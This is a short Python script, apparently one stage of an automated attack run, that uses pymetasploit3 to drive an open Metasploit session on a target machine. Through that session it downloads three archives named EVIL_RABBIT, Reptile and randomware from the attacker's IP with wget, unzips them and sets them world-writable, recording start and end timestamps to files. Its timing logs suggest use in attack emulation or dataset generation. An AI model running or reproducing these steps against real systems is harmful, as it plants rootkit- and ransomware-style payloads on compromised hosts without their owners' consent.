import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    time.sleep(2)
    output_time_file = 'time_stage_2_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    shell = client.sessions.session('1')
    shell.write('wget --no-check-certificate http://{0}/downloads/EVIL_RABBIT.zip'.format(my_ip))
    shell.write('wget --no-check-certificate http://{0}/downloads/Reptile.zip'.format(my_ip))
    shell.write('wget --no-check-certificate http://{0}/downloads/randomware.zip'.format(my_ip))
    shell.write('unzip EVIL_RABBIT.zip')
    shell.write('unzip Reptile.zip')
    shell.write('unzip randomware.zip')
    shell.write('chmod -R 777 EVIL_RABBIT')
    shell.write('chmod -R 777 Reptile')
    shell.write('chmod -R 777 randomware')

    time.sleep(10)
    output_time_file = 'time_stage_2_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)


main(sys.argv)
